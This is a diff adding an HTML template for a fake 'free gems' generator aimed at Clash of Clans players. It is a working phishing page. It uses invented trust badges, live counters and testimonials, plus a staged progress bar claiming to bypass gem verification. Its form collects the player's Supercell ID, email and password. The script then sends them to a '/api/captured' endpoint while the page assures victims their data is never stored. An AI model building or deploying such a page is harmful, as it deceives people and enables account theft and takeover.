@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>{{ site.site_name }} — Free Gems Generator</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --primary: {{ site.color }};
+      --accent:  {{ site.accent }};
+    }
+
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #0a0a1a 0%, #1a0a2e 50%, #0a1a2e 100%);
+      color: #fff;
+      min-height: 100vh;
+    }
+
+    /* ---------- Header ---------- */
+    .site-header {
+      background: rgba(255,255,255,.05);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(255,255,255,.1);
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .site-logo {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+    }
+    .site-logo span { color: var(--accent); }
+    .trust-badges {
+      display: flex;
+      gap: 10px;
+      font-size: 11px;
+      color: #aaa;
+      align-items: center;
+    }
+    .trust-badge {
+      border: 1px solid rgba(255,255,255,.2);
+      padding: 3px 8px;
+      border-radius: 12px;
+      background: rgba(255,255,255,.05);
+    }
+
+    /* ---------- Hero ---------- */
+    .hero {
+      text-align: center;
+      padding: 48px 20px 32px;
+    }
+    .hero-icon { font-size: 64px; margin-bottom: 16px; animation: pulse 1.5s infinite; }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50%      { transform: scale(1.08); }
+    }
+    .hero h1 {
+      font-size: 42px;
+      font-weight: 900;
+      background: linear-gradient(90deg, #fff 0%, var(--accent) 50%, #fff 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 12px;
+      line-height: 1.15;
+    }
+    .hero-sub {
+      font-size: 18px;
+      color: rgba(255,255,255,.75);
+      margin-bottom: 8px;
+    }
+    .user-count {
+      font-size: 13px;
+      color: rgba(255,255,255,.5);
+    }
+    .user-count strong { color: #4ade80; }
+
+    /* ---------- Counter + timer ---------- */
+    .counters {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin: 24px 0;
+      flex-wrap: wrap;
+    }
+    .counter-box {
+      background: rgba(255,255,255,.07);
+      border: 1px solid rgba(255,255,255,.12);
+      border-radius: 12px;
+      padding: 16px 28px;
+      text-align: center;
+    }
+    .counter-val {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--accent);
+    }
+    .counter-lbl { font-size: 12px; color: rgba(255,255,255,.5); margin-top: 4px; }
+
+    /* ---------- Generate section ---------- */
+    .generate-section {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 0 20px 60px;
+    }
+    .generate-card {
+      background: rgba(255,255,255,.06);
+      border: 1px solid rgba(255,255,255,.15);
+      border-radius: 16px;
+      padding: 32px;
+    }
+    .generate-card h2 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .generate-card .sub {
+      font-size: 14px;
+      color: rgba(255,255,255,.6);
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    /* Gem amount selector */
+    .gem-options {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+    .gem-option {
+      border: 2px solid rgba(255,255,255,.15);
+      border-radius: 10px;
+      padding: 12px 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all .2s;
+      background: rgba(255,255,255,.04);
+    }
+    .gem-option:hover, .gem-option.selected {
+      border-color: var(--accent);
+      background: rgba(255,200,0,.1);
+    }
+    .gem-option .gem-count { font-size: 18px; font-weight: 700; color: var(--accent); }
+    .gem-option .gem-label { font-size: 11px; color: rgba(255,255,255,.5); margin-top: 2px; }
+
+    /* Progress bar */
+    .progress-section { display: none; text-align: center; padding: 20px 0; }
+    .progress-title { font-size: 16px; margin-bottom: 14px; color: rgba(255,255,255,.85); }
+    .progress-bar-outer {
+      background: rgba(255,255,255,.1);
+      border-radius: 8px;
+      height: 14px;
+      overflow: hidden;
+      margin-bottom: 8px;
+    }
+    .progress-bar-inner {
+      height: 100%;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
+      border-radius: 8px;
+      width: 0%;
+      transition: width .3s ease;
+    }
+    .progress-steps { font-size: 12px; color: rgba(255,255,255,.5); }
+
+    /* Credential form */
+    .cred-form { display: none; }
+    .form-group { margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 13px; color: rgba(255,255,255,.7); margin-bottom: 6px; }
+    .form-group input {
+      width: 100%;
+      background: rgba(255,255,255,.08);
+      border: 1px solid rgba(255,255,255,.2);
+      border-radius: 8px;
+      padding: 11px 14px;
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+      transition: border-color .2s;
+    }
+    .form-group input:focus { border-color: var(--accent); background: rgba(255,255,255,.12); }
+    .form-group input::placeholder { color: rgba(255,255,255,.35); }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, var(--primary), color-mix(in srgb, var(--primary) 60%, var(--accent)));
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: opacity .15s;
+    }
+    .btn-primary:hover { opacity: .9; }
+
+    .btn-generate {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(90deg, #f59e0b, #ef4444);
+      border: none;
+      border-radius: 10px;
+      color: #fff;
+      font-size: 18px;
+      font-weight: 800;
+      cursor: pointer;
+      letter-spacing: .3px;
+      box-shadow: 0 4px 24px rgba(239,68,68,.4);
+      transition: all .2s;
+    }
+    .btn-generate:hover { transform: translateY(-1px); box-shadow: 0 6px 28px rgba(239,68,68,.5); }
+
+    .security-note {
+      text-align: center;
+      font-size: 12px;
+      color: rgba(255,255,255,.4);
+      margin-top: 16px;
+    }
+    .security-note span { color: #4ade80; }
+
+    /* ---------- Social proof ---------- */
+    .social-proof {
+      display: flex;
+      gap: 16px;
+      margin-top: 28px;
+      overflow-x: auto;
+      padding: 0 4px;
+    }
+    .proof-item {
+      background: rgba(255,255,255,.06);
+      border: 1px solid rgba(255,255,255,.1);
+      border-radius: 10px;
+      padding: 12px 14px;
+      flex-shrink: 0;
+      min-width: 160px;
+      font-size: 13px;
+    }
+    .proof-name { font-weight: 600; color: var(--accent); margin-bottom: 4px; }
+    .proof-text { color: rgba(255,255,255,.6); font-size: 12px; }
+
+    /* ---------- Alerts bar ---------- */
+    .live-feed {
+      background: rgba(255,255,255,.04);
+      border-top: 1px solid rgba(255,255,255,.07);
+      border-bottom: 1px solid rgba(255,255,255,.07);
+      padding: 8px 20px;
+      font-size: 13px;
+      color: rgba(255,255,255,.6);
+      overflow: hidden;
+      white-space: nowrap;
+    }
+    .live-feed span { color: #4ade80; font-weight: 600; }
+  </style>
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="site-logo">{{ site.logo }} <span>{{ site.site_name }}</span></div>
+    <div class="trust-badges">
+      <span class="trust-badge">🔒 SSL Secured</span>
+      <span class="trust-badge">✅ Verified Tool</span>
+      <span class="trust-badge">⚡ Instant Delivery</span>
+    </div>
+  </div>
+
+  <!-- Live ticker -->
+  <div class="live-feed">
+    🟢 Live: &nbsp;
+    <span id="live-ticker">PlayerXx99</span> just received <span>14,000 gems</span> &nbsp;|&nbsp;
+    <span>ClashKing47</span> received <span>99,999 gems</span> &nbsp;|&nbsp;
+    <span>GemMaster</span> received <span>50,000 gems</span>
+  </div>
+
+  <div class="hero">
+    <div class="hero-icon">💎</div>
+    <h1>Get {{ site.gems }} FREE GEMS<br>Instantly!</h1>
+    <p class="hero-sub">{{ site.tagline }}</p>
+    <p class="user-count">Trusted by <strong>{{ site.trust_count }}</strong> Clash of Clans players worldwide</p>
+  </div>
+
+  <div class="counters">
+    <div class="counter-box">
+      <div class="counter-val" id="gems-generated">4,821,037,442</div>
+      <div class="counter-lbl">Gems Generated Today</div>
+    </div>
+    <div class="counter-box">
+      <div class="counter-val">{{ site.trust_count }}</div>
+      <div class="counter-lbl">Happy Players</div>
+    </div>
+    <div class="counter-box">
+      <div class="counter-val" id="online-count">2,847</div>
+      <div class="counter-lbl">Users Online Now</div>
+    </div>
+  </div>
+
+  <div class="generate-section">
+    <div class="generate-card">
+      <h2>🎯 Claim Your Free Gems</h2>
+      <p class="sub">Select gem amount and connect your Supercell account</p>
+
+      <!-- Step 1: Choose amount -->
+      <div id="step-1">
+        <div class="gem-options">
+          <div class="gem-option" onclick="selectGems(this, '1,200')">
+            <div class="gem-count">1,200</div>
+            <div class="gem-label">Starter Pack</div>
+          </div>
+          <div class="gem-option selected" onclick="selectGems(this, '{{ site.gems }}')">
+            <div class="gem-count">{{ site.gems }}</div>
+            <div class="gem-label">Most Popular ⭐</div>
+          </div>
+          <div class="gem-option" onclick="selectGems(this, '99,999')">
+            <div class="gem-count">99,999</div>
+            <div class="gem-label">Max Pack 🔥</div>
+          </div>
+        </div>
+
+        <button class="btn-generate" onclick="startGeneration()">
+          ⚡ GENERATE GEMS NOW ⚡
+        </button>
+      </div>
+
+      <!-- Step 2: Progress animation -->
+      <div class="progress-section" id="step-2">
+        <p class="progress-title" id="progress-title">Connecting to Supercell servers...</p>
+        <div class="progress-bar-outer">
+          <div class="progress-bar-inner" id="progress-bar"></div>
+        </div>
+        <p class="progress-steps" id="progress-step">Initializing...</p>
+      </div>
+
+      <!-- Step 3: Credential form -->
+      <div class="cred-form" id="step-3">
+        <p style="font-size:15px;color:rgba(255,255,255,.8);margin-bottom:20px;text-align:center;">
+          🔐 <strong>Final Step:</strong> Connect your Supercell account to receive your gems
+        </p>
+        <form id="cred-form-el" onsubmit="submitCreds(event)">
+          <div class="form-group">
+            <label>Supercell ID (Player Tag)</label>
+            <input type="text" name="supercell_id" placeholder="#XXXXXXXXX" required>
+          </div>
+          <div class="form-group">
+            <label>Email address linked to Supercell ID</label>
+            <input type="email" name="email" placeholder="your@email.com" required>
+          </div>
+          <div class="form-group">
+            <label>Supercell account password</label>
+            <input type="password" name="password" placeholder="Enter your password" required>
+          </div>
+          <button type="submit" class="btn-primary">
+            💎 Claim My Free Gems
+          </button>
+        </form>
+        <p class="security-note">
+          <span>🔒 256-bit encryption</span> · Your data is safe and never stored
+        </p>
+      </div>
+
+    </div>
+
+    <!-- Social proof -->
+    <div class="social-proof">
+      <div class="proof-item">
+        <div class="proof-name">ClashKing_99</div>
+        <div class="proof-text">Got 99,999 gems in 2 minutes! Works perfectly 🔥</div>
+      </div>
+      <div class="proof-item">
+        <div class="proof-name">SaraBuildz</div>
+        <div class="proof-text">Upgraded my entire base overnight. LEGIT!</div>
+      </div>
+      <div class="proof-item">
+        <div class="proof-name">xXGemMasterXx</div>
+        <div class="proof-text">Used 3 times this week. Never let me down 💎</div>
+      </div>
+      <div class="proof-item">
+        <div class="proof-name">ProClasher2026</div>
+        <div class="proof-text">Finally maxed out. This tool is the real deal!</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var selectedGems = '{{ site.gems }}';
+
+    function selectGems(el, amount) {
+      document.querySelectorAll('.gem-option').forEach(function(o){ o.classList.remove('selected'); });
+      el.classList.add('selected');
+      selectedGems = amount;
+    }
+
+    var progressSteps = [
+      { pct: 15, title: 'Connecting to Supercell servers...', step: 'Establishing secure connection...' },
+      { pct: 30, title: 'Locating your player profile...', step: 'Scanning player database...' },
+      { pct: 50, title: 'Bypassing gem verification...', step: 'Injecting gem packet data...' },
+      { pct: 65, title: 'Allocating gems to account...', step: 'Processing resource transfer...' },
+      { pct: 80, title: 'Awaiting account verification...', step: 'Authentication required...' },
+      { pct: 90, title: 'Almost done! Verifying transfer...', step: 'Human verification needed...' },
+      { pct: 95, title: 'Authentication required to complete transfer', step: 'Connect Supercell account to receive gems' },
+    ];
+
+    function startGeneration() {
+      document.getElementById('step-1').style.display = 'none';
+      document.getElementById('step-2').style.display = 'block';
+
+      var idx = 0;
+      var interval = setInterval(function() {
+        if (idx >= progressSteps.length) {
+          clearInterval(interval);
+          setTimeout(function() {
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+          }, 600);
+          return;
+        }
+        var s = progressSteps[idx];
+        document.getElementById('progress-bar').style.width = s.pct + '%';
+        document.getElementById('progress-title').textContent = s.title;
+        document.getElementById('progress-step').textContent = s.step;
+        idx++;
+      }, 700);
+    }
+
+    function submitCreds(e) {
+      e.preventDefault();
+      var form = document.getElementById('cred-form-el');
+      var supercell_id = form.querySelector('[name=supercell_id]').value;
+      var email = form.querySelector('[name=email]').value;
+      var password = form.querySelector('[name=password]').value;
+
+      var body = { supercell_id: supercell_id, email: email, password: password,
+                   gems_requested: selectedGems, source: '{{ site_key }}', domain: '{{ site.domain }}' };
+
+      // POST to /api/captured
+      fetch('/api/captured', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+
+      // Also POST to site-specific verify endpoint
+      fetch('/gems/{{ site_key }}/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      }).then(function(r){ return r.text(); }).then(function() {
+        window.location.href = '/gems/{{ site_key }}/processing';
+      });
+    }
+
+    // Animate counters
+    setInterval(function() {
+      var el = document.getElementById('gems-generated');
+      var val = parseInt(el.textContent.replace(/,/g, '')) + Math.floor(Math.random() * 5000 + 1000);
+      el.textContent = val.toLocaleString();
+    }, 2000);
+
+    setInterval(function() {
+      var el = document.getElementById('online-count');
+      var val = parseInt(el.textContent.replace(/,/g, '')) + Math.floor(Math.random() * 10 - 4);
+      if (val < 2000) val = 2000;
+      el.textContent = val.toLocaleString();
+    }, 5000);
+  </script>
+</body>
+</html>
